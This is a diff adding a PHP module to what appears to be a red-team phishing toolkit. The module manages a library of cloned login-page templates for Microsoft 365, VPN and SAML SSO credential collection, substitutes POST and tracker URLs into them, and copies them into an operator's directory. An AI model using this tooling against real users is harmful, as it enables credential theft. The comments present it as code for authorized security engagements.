@@ -1,0 +1,215 @@
+<?php
+/**
+ * Phase 3.46: hand-curated landing-page clone library.
+ *
+ * Operators tweak per-engagement (target's actual branding), but a
+ * structural template for the three common patterns saves the bulk
+ * of the work: multi-step credential collection (Microsoft 365 style),
+ * single-page form with optional OTP (generic VPN portal), and the
+ * "you are being redirected" → form pattern (generic SAML SSO).
+ *
+ * Each library entry lives under spear/sniperhost/library/<slug>/ with:
+ *
+ *   index.html        — primary login HTML, references {{POST_URL}} +
+ *                       {{TRACKER_URL}} placeholders the clone action
+ *                       substitutes before writing to the operator's
+ *                       cloned/ directory.
+ *   step2.html        — optional 2FA / second-step page (some templates
+ *                       only). Same placeholders apply.
+ *   meta.json         — { name, description, pattern, fields[],
+ *                         has_2fa, placeholder_notes }
+ *   assets/style.css  — minimal stylesheet (intentionally generic so
+ *                       the operator can layer their target's brand).
+ *
+ * The substitution helpers are pure and tested in isolation
+ * (tests/LandingLibraryTest.php). The clone action lives at the
+ * dispatcher layer; this file only hands it the template bytes +
+ * destination path resolution.
+ *
+ * Trademark + branding caveat:
+ *   These templates ship with PLACEHOLDER branding ("[Microsoft 365]"
+ *   etc.) rather than actual logos. The operator drops in the real
+ *   assets for their authorized engagement. This keeps the public
+ *   repo free of redistributed third-party trademarks and forces the
+ *   per-engagement customization step.
+ */
+
+if (!function_exists('landing_library_root')) {
+    function landing_library_root(): string
+    {
+        return dirname(__FILE__, 2) . '/sniperhost/library';
+    }
+}
+
+if (!function_exists('landing_library_clones_root')) {
+    function landing_library_clones_root(): string
+    {
+        return dirname(__FILE__, 2) . '/sniperhost/cloned';
+    }
+}
+
+if (!function_exists('landing_library_substitute_placeholders')) {
+    /**
+     * Replace {{POST_URL}} and {{TRACKER_URL}} placeholders in HTML
+     * with the operator-supplied values. Pure; no I/O. Both
+     * substitutions are case-sensitive and replace every occurrence.
+     *
+     * If $trackerUrl is empty, the {{TRACKER_URL}} placeholder is
+     * collapsed to an empty string AND the enclosing <script
+     * data-tracker> tag (if present) is also removed so the rendered
+     * HTML has no broken script reference.
+     */
+    function landing_library_substitute_placeholders(string $html, string $postUrl, string $trackerUrl = ''): string
+    {
+        $html = str_replace('{{POST_URL}}', htmlspecialchars($postUrl, ENT_QUOTES, 'UTF-8'), $html);
+        if ($trackerUrl === '') {
+            // Strip the entire wrapped tracker tag so we don't leave
+            // a dangling src="" that 404s in the browser console.
+            $html = preg_replace('#<script[^>]*data-tracker[^>]*src="\{\{TRACKER_URL\}\}"[^>]*></script>#i', '', $html) ?? $html;
+            $html = str_replace('{{TRACKER_URL}}', '', $html);
+        } else {
+            $html = str_replace('{{TRACKER_URL}}', htmlspecialchars($trackerUrl, ENT_QUOTES, 'UTF-8'), $html);
+        }
+        return $html;
+    }
+}
+
+if (!function_exists('landing_library_list')) {
+    /**
+     * Enumerate available library entries. Reads each <slug>/meta.json
+     * and returns the merged list sorted by slug.
+     *
+     * @return array<int, array{
+     *   slug:string, name:string, description:string,
+     *   pattern:string, has_2fa:bool, fields:array<int,string>,
+     *   placeholder_notes:string
+     * }>
+     */
+    function landing_library_list(?string $root = null): array
+    {
+        $root = $root ?? landing_library_root();
+        if (!is_dir($root)) return [];
+        $out = [];
+        $entries = @scandir($root) ?: [];
+        sort($entries);
+        foreach ($entries as $slug) {
+            if ($slug === '.' || $slug === '..' || $slug[0] === '.') continue;
+            $dir = $root . '/' . $slug;
+            if (!is_dir($dir)) continue;
+            $metaPath = $dir . '/meta.json';
+            if (!is_file($metaPath)) continue;
+            $j = json_decode((string) @file_get_contents($metaPath), true);
+            if (!is_array($j)) continue;
+            $out[] = [
+                'slug'              => (string) $slug,
+                'name'              => (string) ($j['name'] ?? $slug),
+                'description'       => (string) ($j['description'] ?? ''),
+                'pattern'           => (string) ($j['pattern'] ?? 'single-page'),
+                'has_2fa'           => (bool)   ($j['has_2fa'] ?? false),
+                'fields'            => is_array($j['fields'] ?? null) ? array_values(array_map('strval', $j['fields'])) : [],
+                'placeholder_notes' => (string) ($j['placeholder_notes'] ?? ''),
+            ];
+        }
+        return $out;
+    }
+}
+
+if (!function_exists('landing_library_template_files')) {
+    /**
+     * Pure helper: list the files in a library entry that should be
+     * copied + (for HTML) substituted. Returns each relative path that
+     * exists under $root/<slug>/. Excludes meta.json (we don't ship
+     * that into the operator's clone).
+     *
+     * @return array<int, string> relative paths, e.g. ["index.html", "assets/style.css"]
+     */
+    function landing_library_template_files(string $slug, ?string $root = null): array
+    {
+        $root = $root ?? landing_library_root();
+        $dir  = $root . '/' . $slug;
+        if (!is_dir($dir)) return [];
+        $out = [];
+        $iter = new \RecursiveIteratorIterator(
+            new \RecursiveDirectoryIterator($dir, \FilesystemIterator::SKIP_DOTS)
+        );
+        foreach ($iter as $f) {
+            $rel = ltrim(str_replace($dir, '', (string) $f), '/');
+            if ($rel === 'meta.json') continue;
+            $out[] = $rel;
+        }
+        sort($out);
+        return $out;
+    }
+}
+
+if (!function_exists('landing_library_clone_to_path')) {
+    /**
+     * Copy a library entry into the operator's clones directory,
+     * substituting placeholders in any .html file along the way.
+     *
+     * Returns a structured result with the destination path on
+     * success. Refuses to overwrite an existing destination unless
+     * $force is true.
+     *
+     * @return array{ok:bool, slug?:string, path?:string, files?:int, err?:string}
+     */
+    function landing_library_clone_to_path(
+        string $sourceSlug,
+        string $destSlug,
+        string $postUrl,
+        string $trackerUrl,
+        bool $force,
+        ?string $libraryRoot = null,
+        ?string $clonesRoot = null
+    ): array {
+        $libraryRoot = $libraryRoot ?? landing_library_root();
+        $clonesRoot  = $clonesRoot  ?? landing_library_clones_root();
+        $src = $libraryRoot . '/' . $sourceSlug;
+        if (!is_dir($src) || !is_file($src . '/meta.json')) {
+            return ['ok' => false, 'err' => 'Library entry not found'];
+        }
+        $destSlug = trim($destSlug);
+        if (!preg_match('/^[a-z0-9][a-z0-9-]{0,60}$/', $destSlug)) {
+            return ['ok' => false, 'err' => 'Destination slug must be a-z, 0-9, dash; max 61 chars'];
+        }
+        $dest = $clonesRoot . '/' . $destSlug;
+        if (is_dir($dest) && !$force) {
+            return ['ok' => false, 'err' => 'Destination clone already exists; pass force to overwrite'];
+        }
+        if (!is_dir($clonesRoot) && !@mkdir($clonesRoot, 0775, true) && !is_dir($clonesRoot)) {
+            return ['ok' => false, 'err' => 'Could not create clones root'];
+        }
+        if (!@mkdir($dest, 0775, true) && !is_dir($dest)) {
+            return ['ok' => false, 'err' => 'Could not create destination directory'];
+        }
+
+        $files = landing_library_template_files($sourceSlug, $libraryRoot);
+        $copied = 0;
+        foreach ($files as $rel) {
+            $from = $src . '/' . $rel;
+            $to   = $dest . '/' . $rel;
+            $subdir = dirname($to);
+            if ($subdir !== $dest && !is_dir($subdir) && !@mkdir($subdir, 0775, true) && !is_dir($subdir)) {
+                return ['ok' => false, 'err' => 'Could not create asset subdir'];
+            }
+            if (str_ends_with(strtolower($rel), '.html')) {
+                $html = (string) @file_get_contents($from);
+                $html = landing_library_substitute_placeholders($html, $postUrl, $trackerUrl);
+                if (@file_put_contents($to, $html) === false) {
+                    return ['ok' => false, 'err' => 'Could not write ' . $rel];
+                }
+            } else {
+                if (!@copy($from, $to)) {
+                    return ['ok' => false, 'err' => 'Could not copy ' . $rel];
+                }
+            }
+            $copied++;
+        }
+        return [
+            'ok'    => true,
+            'slug'  => $destSlug,
+            'path'  => 'spear/sniperhost/cloned/' . $destSlug . '/',
+            'files' => $copied,
+        ];
+    }
+}
